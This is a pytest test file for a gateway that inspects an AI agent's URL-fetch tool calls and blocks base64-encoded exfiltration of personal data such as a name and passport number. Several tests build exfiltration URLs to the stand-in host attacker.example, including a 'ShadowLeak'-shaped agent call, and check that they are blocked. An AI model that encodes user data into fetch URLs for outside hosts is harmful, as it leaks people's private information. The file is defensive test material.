"""Engineering tests for url-gw-1.0 — decoding, matching, enforcement,
dispatch. These are NOT additional public incidents; they check the
mechanism on synthetic views."""

import base64
import json
import urllib.parse

import pytest

from tool_routing.argverify.url_fetch_gateway import (
    check_fetch_call,
    decode_url_payload,
    dispatch_fetch,
    LocalFetchDestination,
    match_candidates,
    retrieved_value_index,
)

B64 = lambda s: base64.b64encode(s.encode()).decode()  # noqa: E731


def _pol(view):
    return view["policy"]


def _view(url: str, *, host_entry=None, records=None, fields=None,
          retrieved=None, declared=None, purpose="research_summary"):
    return {
        "acting_principal": "victim.user",
        "clock": "2026-10-21T09:00:00",
        "policy": {"fetch_allowlist": ["docs.acme.example"]},
        "directory": ({k: v for k, v in host_entry.items()} if host_entry else {}),
        "permission_records": records or [],
        "field_metadata": fields or {},
        "conversation": [],
        "retrieved_content": retrieved or [],
        "planner_call": {"tool": "url_fetch", "arguments": {"url": url},
                         "payload_fields": declared or [],
                         "stated_purpose": purpose},
        "planner_claims": {},
    }


PII_FIELDS = {
    "vic.full_name": {"owner": "vic.tim", "class": "personal",
                      "provenance": "tool.t1.output.full_name"},
    "vic.passport_no": {"owner": "vic.tim", "class": "credential",
                        "provenance": "tool.t1.output.passport_no"},
}
PII_RETRIEVED = [{"call_id": "t1", "tool": "lookup_inbox",
                  "output": {"full_name": "Vic Tim", "passport_no": "X123"}}]


# --- decoding ---------------------------------------------------------------

def test_b64_query_param_decodes_and_logs():
    url = f"http://h/?d={B64('hello')}"
    d = decode_url_payload(url)
    cand = d["candidates"][0]
    assert cand["decoded"] == "hello"
    assert "base64_decode" in cand["steps"]
    assert d["parsed"]["host"] == "h"


def test_plain_param_recorded_raw_no_decoding():
    d = decode_url_payload("http://h/?q=plain-text")
    assert d["candidates"][0]["decoded"] is None
    assert d["candidates"][0]["raw"] == "plain-text"


def test_oversized_url_rejected():
    d = decode_url_payload("http://h/?d=" + "a" * 5000)
    assert any("oversized" in e for e in d["errors"])


def test_param_count_bounded():
    d = decode_url_payload("http://h/?" + "&".join(f"p{i}=1" for i in range(40)))
    assert len(d["candidates"]) <= 32 + 16


def test_unparseable_url_recorded_not_crash():
    d = decode_url_payload("http://h/?d=%GG")
    assert "errors" in d and d["candidates"] is not None  # parse_qsl tolerates


# --- matching ---------------------------------------------------------------

def test_exact_match_attributes_field():
    v = _view("http://h/?d=x", fields=PII_FIELDS, retrieved=PII_RETRIEVED)
    idx = retrieved_value_index(v)
    m = match_candidates(decode_url_payload(f"http://h/?d={B64('Vic Tim')}")["candidates"], idx)
    assert [x["field_id"] for x in m] == ["vic.full_name"]


def test_b64_json_payload_members_matched():
    payload = B64(json.dumps({"full_name": "Vic Tim", "passport_no": "X123"}))
    v = _view(f"http://h/?d={payload}", fields=PII_FIELDS, retrieved=PII_RETRIEVED)
    m = match_candidates(decode_url_payload(v["planner_call"]["arguments"]["url"])["candidates"],
                         retrieved_value_index(v))
    assert {x["field_id"] for x in m} == {"vic.full_name", "vic.passport_no"}


def test_unlabeled_value_marks_uncertain():
    retrieved = [{"call_id": "t1", "output": {"mystery": "secret42"}}]
    v = _view("http://h/?d=x", fields={}, retrieved=retrieved)
    m = match_candidates(decode_url_payload("http://h/?d=secret42")["candidates"],
                         retrieved_value_index(v))
    assert m[0]["uncertain"] and m[0]["field_id"].startswith("<unlabeled:")


def test_ambiguous_value_recorded():
    fields = {"a.x": {"owner": "a", "class": "internal",
                      "provenance": "tool.t1.output.x"},
              "b.x": {"owner": "b", "class": "personal",
                      "provenance": "tool.t2.output.x"}}
    retrieved = [{"call_id": "t1", "output": {"x": "same"}},
                 {"call_id": "t2", "output": {"x": "same"}}]
    v = _view("http://h/?d=same", fields=fields, retrieved=retrieved)
    m = match_candidates(decode_url_payload("http://h/?d=same")["candidates"],
                         retrieved_value_index(v))
    assert all(x["uncertain"] for x in m)


# --- enforcement ------------------------------------------------------------

def test_shadowleak_shape_blocked_unauthorized_host_and_protected():
    url = f"http://attacker.example/?d={B64(json.dumps({'full_name': 'Vic Tim'}))}"
    r = check_fetch_call(view := _view(url, fields=PII_FIELDS, retrieved=PII_RETRIEVED),
                         "2026-10-21T09:00:00", view["policy"])
    assert r["execution"] == "block"
    kinds = {f["finding"] for f in r["findings"]}
    assert "fetch_host_offlist" in kinds and "unresolved_destination" in kinds


def test_allowlisted_host_alone_does_not_authorize_protected():
    url = f"http://docs.acme.example/?d={B64('Vic Tim')}"
    r = check_fetch_call(view := _view(url, host_entry={"docs.acme.example":
                                              {"principal": "docs.svc",
                                               "class": "external_known"}},
                               fields=PII_FIELDS, retrieved=PII_RETRIEVED),
                         "2026-10-21T09:00:00", view["policy"])
    assert r["execution"] == "block"
    assert "no_authorization" in {f["finding"] for f in r["findings"]}
    assert "fetch_host_offlist" not in {f["finding"] for f in r["findings"]}


def test_authorized_record_permits_on_allowlisted_host():
    rec = {"auth_id": "auth.1", "data_owner": "vic.tim", "effect": "allow",
           "granted_by": {"principal": "vic.tim", "source": "turn.2"},
           "permitted_fields": ["vic.full_name"],
           "destination_principal": "docs.svc", "purpose": "research_summary",
           "expires": "2027-01-01"}
    url = f"http://docs.acme.example/?d={B64('Vic Tim')}"
    view = _view(url, host_entry={"docs.acme.example": {"principal": "docs.svc",
                                                      "class": "external_known"}},
                 fields=PII_FIELDS, retrieved=PII_RETRIEVED, records=[rec],
                 declared=["vic.full_name"])
    view["conversation"] = [{"turn": 2, "speaker": "vic.tim",
                             "authenticated": True, "text": "yes"}]
    r = check_fetch_call(view, "2026-10-21T09:00:00", view["policy"])
    assert r["execution"] == "allow"


def test_public_content_on_allowlisted_host_allowed():
    fields = {"x.stat": {"owner": "vic.tim", "class": "public",
                         "provenance": "tool.t1.output.stat"}}
    retrieved = [{"call_id": "t1", "output": {"stat": "open-data-9"}}]
    url = "http://docs.acme.example/?q=open-data-9"
    view = _view(url, host_entry={"docs.acme.example": {"principal": "docs.svc",
                                                      "class": "external_known"}},
                 fields=fields, retrieved=retrieved, declared=["x.stat"])
    r = check_fetch_call(view, "2026-10-21T09:00:00", view["policy"])
    assert r["execution"] == "allow"


def test_deny_record_wins_over_allow():
    recs = [{"auth_id": "auth.a", "data_owner": "vic.tim", "effect": "allow",
             "granted_by": {"principal": "vic.tim", "source": "turn.2"},
             "permitted_fields": ["vic.full_name"],
             "destination_principal": "docs.svc",
             "purpose": "research_summary", "expires": "2027-01-01"},
            {"auth_id": "auth.d", "data_owner": "vic.tim", "effect": "deny",
             "granted_by": {"principal": "vic.tim", "source": "turn.2"},
             "permitted_fields": ["vic.full_name"],
             "destination_principal": "docs.svc",
             "purpose": "research_summary", "expires": "2027-01-01"}]
    url = f"http://docs.acme.example/?d={B64('Vic Tim')}"
    view = _view(url, host_entry={"docs.acme.example": {"principal": "docs.svc",
                                                      "class": "external_known"}},
                 fields=PII_FIELDS, retrieved=PII_RETRIEVED, records=recs)
    view["conversation"] = [{"turn": 2, "speaker": "vic.tim",
                             "authenticated": True, "text": "yes"}]
    r = check_fetch_call(view, "2026-10-21T09:00:00", view["policy"])
    assert r["execution"] == "block"


def test_unaccounted_carrier_blocks():
    # payload present in URL but matches nothing retrieved and declares nothing
    url = f"http://docs.acme.example/?d={B64('never-seen-9')}"
    view = _view(url, host_entry={"docs.acme.example": {"principal": "docs.svc",
                                                      "class": "external_known"}},
                 fields=PII_FIELDS, retrieved=PII_RETRIEVED)
    r = check_fetch_call(view, "2026-10-21T09:00:00", view["policy"])
    assert r["execution"] == "block"
    assert "unaccounted_payload" in {f["finding"] for f in r["findings"]}


def test_strict_f5_matched_field_does_not_launder_extra_carrier():
    # url-gw-1.0 defect: a declared+matched field suppressed
    # unaccounted_payload for sibling carriers. 1.1: independent.
    rec = {"auth_id": "a2", "data_owner": "vic.tim", "effect": "allow",
           "granted_by": {"principal": "v", "source": "app.permission"},
           "permitted_fields": ["vic.full_name"],
           "destination_principal": "docs.svc",
           "purpose": "research_summary",
           "constraints": {"not_after": "2027-01-01"}}
    url = "http://docs.acme.example/i?name=Vic%20Tim&d=opaque-blob"
    view = _view(url, host_entry={"docs.acme.example":
                                  {"principal": "docs.svc",
                                   "class": "external_known"}},
                 fields=PII_FIELDS, retrieved=PII_RETRIEVED,
                 records=[rec], declared=["vic.full_name"])
    legacy = check_fetch_call(view, "2026-10-21T09:00:00",
                              view["policy"], f5_mode="legacy")
    assert legacy["execution"] == "allow"  # defect reproduced
    strict = check_fetch_call(view, "2026-10-21T09:00:00",
                              view["policy"], f5_mode="strict")
    assert strict["execution"] == "block"
    assert "unaccounted_payload" in {f["finding"] for f in
                                     strict["findings"]}


def test_strict_f5_partial_json_member_unmatched_blocks():
    rec = {"auth_id": "a2", "data_owner": "vic.tim", "effect": "allow",
           "granted_by": {"principal": "v", "source": "app.permission"},
           "permitted_fields": ["vic.full_name"],
           "destination_principal": "docs.svc",
           "purpose": "research_summary",
           "constraints": {"not_after": "2027-01-01"}}
    payload = B64(json.dumps({"n": "Vic Tim", "x": "X12"}))
    url = f"http://docs.acme.example/i?d={payload}"
    view = _view(url, host_entry={"docs.acme.example":
                                  {"principal": "docs.svc",
                                   "class": "external_known"}},
                 fields=PII_FIELDS, retrieved=PII_RETRIEVED,
                 records=[rec], declared=["vic.full_name"])
    r = check_fetch_call(view, "2026-10-21T09:00:00", view["policy"])
    assert r["execution"] == "block"
    assert "unaccounted_payload" in {f["finding"] for f in r["findings"]}


def test_strict_f5_empty_value_accounted():
    url = "http://docs.acme.example/i?ref="
    view = _view(url, host_entry={"docs.acme.example":
                                  {"principal": "docs.svc",
                                   "class": "external_known"}},
                 fields=PII_FIELDS, retrieved=PII_RETRIEVED)
    r = check_fetch_call(view, "2026-10-21T09:00:00", view["policy"])
    assert r["execution"] == "allow"


def test_undeclared_field_in_url_is_defect():
    url = "http://docs.acme.example/?q=open-data-9"
    fields = {"x.stat": {"owner": "v", "class": "public",
                         "provenance": "tool.t1.output.stat"}}
    retrieved = [{"call_id": "t1", "output": {"stat": "open-data-9"}}]
    view = _view(url, host_entry={"docs.acme.example": {"principal": "docs.svc",
                                                      "class": "external_known"}},
                 fields=fields, retrieved=retrieved, declared=[])
    r = check_fetch_call(view, "2026-10-21T09:00:00", view["policy"])
    assert {"type": "undeclared_field_in_url", "field": "x.stat"} in r["defects"]


# --- dispatch ---------------------------------------------------------------

def test_dispatch_refuses_nonlocal():
    out = dispatch_fetch("http://attacker.example/?d=x")
    assert not out["sent"] and "non-local" in out["reason"]


def test_dispatch_local_records_serialized_url():
    sink = LocalFetchDestination()
    url = f"http://127.0.0.1:1/?d={B64('x')}"
    out = dispatch_fetch(url, sink)
    assert sink.received == [{"url": url}]  # recorded exactly as serialized
    assert not out["sent"]  # nothing listening — refused, but URL recorded
